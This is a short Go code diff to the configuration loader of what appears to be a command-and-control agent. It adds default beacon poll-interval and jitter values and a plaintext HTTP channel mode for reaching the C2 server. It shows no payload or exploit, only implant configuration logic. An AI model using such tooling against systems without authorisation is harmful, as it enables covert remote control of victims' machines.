@@ -37,6 +37,14 @@ func InitConfig() (err error) {
 		return fmt.Errorf("parsing %d bytes of CBOR data (%s...): %v", len(configData), short_view, err)
 	}
 
+	// Safe defaults
+	if RuntimeConfig.PollInterval == 0 {
+		RuntimeConfig.PollInterval = 60
+	}
+	if RuntimeConfig.Jitter == 0 {
+		RuntimeConfig.Jitter = 20
+	}
+
 	// Deprecated: AgentRoot and UtilsPath are no longer used
 
 	// CC Address
@@ -68,6 +76,8 @@ func InitConfig() (err error) {
 	} else if RuntimeConfig.UseKCP {
 		RuntimeConfig.CCPort = RuntimeConfig.KCPClientPort
 		def.CCAddress = fmt.Sprintf("https://127.0.0.1:%s", RuntimeConfig.CCPort)
+	} else if RuntimeConfig.C2ChannelMode == "plain_http" {
+		def.CCAddress = fmt.Sprintf("http://%s:%s", def.CCAddress, RuntimeConfig.CCHTTPPort)
 	} else {
 		def.CCAddress = fmt.Sprintf("https://%s:%s", def.CCAddress, RuntimeConfig.CCPort)
 	}
